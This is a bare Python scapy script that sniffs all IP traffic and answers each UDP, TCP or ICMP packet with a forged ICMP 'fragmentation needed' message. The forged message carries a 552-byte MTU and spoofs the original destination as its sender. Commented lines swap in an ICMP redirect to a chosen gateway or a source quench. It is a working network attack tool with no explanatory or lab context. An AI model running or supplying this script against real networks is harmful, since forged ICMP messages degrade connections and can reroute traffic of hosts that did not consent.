from scapy.layers.inet import *
from scapy.all import sniff
from scapy.all import send
from scapy.all import Raw


def packet_processor(packet):
    ether = packet
    packet = ether.payload
    src_ip = packet.src
    dst_ip = packet.dst
    protocol = packet.proto
    payload = packet.payload
    payload = bytes(payload)
    a = list(payload)
    payload = Raw(a[:8])

    if protocol == 17 or protocol == 1 or protocol == 6:  # UDP or ICMP or TCP
        crafted_payload = packet
        crafted_payload.payload = payload

        icmp = ICMP()
        icmp.type = 3
        icmp.code = 4
        icmp.nexthopmtu = 552
        # icmp.type = 5
        # icmp.code = 1
        # icmp.gw = '172.16.1.232'

        # icmp.type = 4
        # icmp.code = 0
        icmp.payload = crafted_payload

        ip = IP()
        ip.src = dst_ip
        ip.dst = src_ip
        ip.payload = icmp

        send(ip)
    else:
        pass


sniff(filter='ip', prn=packet_processor)
